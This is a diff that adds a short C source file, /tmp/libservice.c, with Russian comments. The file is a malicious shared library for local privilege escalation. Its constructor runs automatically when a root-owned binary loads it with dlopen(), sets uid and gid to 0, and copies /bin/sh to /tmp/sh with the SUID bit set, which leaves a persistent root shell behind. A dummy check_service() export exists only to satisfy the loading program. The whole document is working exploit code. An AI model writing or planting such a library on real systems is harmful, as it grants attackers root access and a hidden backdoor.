@@ -1,0 +1,18 @@
+// /tmp/libservice.c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdlib.h>
+
+// Конструктор выполнится сразу при dlopen() под root
+__attribute__((constructor))
+static void init(void) {
+    setuid(0); setgid(0);
+    // Делаем SUID-копию /bin/sh
+    system("cp /bin/sh /tmp/sh && chmod 4755 /tmp/sh");
+}
+
+// Формальная точка входа, которую ищет бинарь
+int check_service(const char *name) {
+    return 0;
+}
+
